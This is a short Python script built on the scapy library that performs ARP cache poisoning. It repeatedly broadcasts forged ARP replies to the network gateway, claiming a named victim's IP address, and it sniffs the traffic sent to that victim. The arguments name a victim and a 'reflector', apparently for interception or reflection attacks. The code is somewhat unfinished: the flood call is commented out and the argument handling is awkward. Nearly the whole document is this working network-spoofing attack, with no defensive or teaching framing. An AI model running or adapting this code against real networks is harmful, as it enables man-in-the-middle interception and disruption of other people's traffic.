#!/usr/bin/env python3
from scapy.all import *
import asyncio
from multiprocessing.dummy import Pool as ThreadPool


def get_gateway(iface):
    gw = conf.route.route("0.0.0.0")[2]
    mac = getmacbyip(gw)
    return gw, mac

async def flood_arp_cache(is_at_ip,gw,gw_mac,iface):
    while True:
        own_mac = get_if_hwaddr(iface)    
        arp = ARP(op=2, hwsrc=own_mac,psrc=is_at_ip, pdst=gw,hwdst=gw_mac)
        eth=Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = eth / arp
        sendp(pkt,iface=iface)



def listen_on_victim(victim_ip):
    p = sniff(filter="dst host {0}".format(victim_ip))
    return p[0]

def main():
    if __name__ == '__main__':
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument('--interface', required=True)
        parser.add_argument('--victim-ip', required=True)
        parser.add_argument('--victim-ethernet', required=True)
        parser.add_argument('--reflector-ip', required=True)
        parser.add_argument('--reflector-ethernet', required=True)
        args=parser.parse_args()
        print(args)
        
    

    iface=args.interface    
    victim_ip=args.victim_ip
    reflector_ip=args.reflector_ip


    gw,gw_mac = get_gateway(iface)            
    # task = asyncio.run(flood_arp_cache(victim_ip,gw,gw_mac,iface))

    loop = asyncio.new_event_loop()
    
    listen_on_victim(victim_ip)
    return
    

main()